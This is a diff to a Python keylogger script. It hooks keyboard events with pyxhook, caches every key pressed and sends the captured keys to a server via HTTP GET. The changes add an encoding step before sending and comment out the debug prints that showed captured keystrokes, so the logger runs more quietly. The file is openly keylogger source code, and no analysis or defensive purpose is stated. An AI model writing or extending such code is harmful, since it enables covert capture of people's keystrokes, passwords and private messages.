@@ -7,6 +7,7 @@ sys.path.append(os.path.abspath("../pyxhook-master/")) #To allow for the pyxhook
 
 import pyxhook
 import time
+import parsingTool
 
 running = False
 cache = []
@@ -14,9 +15,12 @@ startTime = 0
 endTime = 0
 
 def sendData(cache):
-    stringData = ''.join(cache)
+    stringData = parsingTool.encodeData(cache)
     payload = {"cache" : stringData}
     r = requests.get("http://127.0.0.1:8000", params=payload)
+    global startTime
+    global endTime
+
 
 def cacheData(dataChars):
     #This should create a JSON object as a cache... TODO
@@ -27,17 +31,17 @@ def cacheData(dataChars):
 
 def kbevent (event):
     #print event
-    print event
+    #print event
     # Cache the data.
     cacheData(event.Key)
     #Send data to server after given period.
-    print cache
+    #print cache
 
     global startTime
     global endTime
 
-    print startTime
-    print endTime
+    #print startTime
+    #print endTime
 
     #Kill logging if given code is hit.
     if event.Ascii == 65:
